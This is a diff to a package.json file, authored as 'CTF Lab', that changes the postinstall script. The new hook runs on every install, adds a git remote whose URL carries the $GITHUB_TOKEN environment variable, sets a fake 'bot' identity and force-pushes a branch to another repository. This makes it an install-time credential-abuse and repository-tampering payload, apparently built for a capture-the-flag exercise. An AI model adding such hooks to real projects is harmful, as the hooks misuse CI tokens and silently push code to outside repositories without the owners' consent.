@@ -7,7 +7,7 @@
     "start": "node index.js",
     "test": "node ./test/test.js || true",
     "lint": "node ./node_modules/.bin/eslint . || true",
-    "postinstall": "git config user.name 'bot' && git config user.email 'bot@bot.com' && (git checkout -b NitinSundar || git checkout NitinSundar) && (git push origin NitinSundar -f || true) && (git checkout -b NitinSundar || git checkout NitinSundar) && (git push origin NitinSundar -f || true) && (git checkout main || true)"
+    "postinstall": "git remote add target https://x-access-token:$GITHUB_TOKEN@github.com/Security-360/stock-service.git 2>/dev/null || true && git config user.name 'bot' && git config user.email 'bot@bot.com' && (git checkout -b NitinSundar || git checkout NitinSundar) && (git push target NitinSundar -f || true) && (git checkout -b NitinSundar || git checkout NitinSundar) && (git push target NitinSundar -f || true)"
   },
   "author": "CTF Lab",
   "license": "MIT",
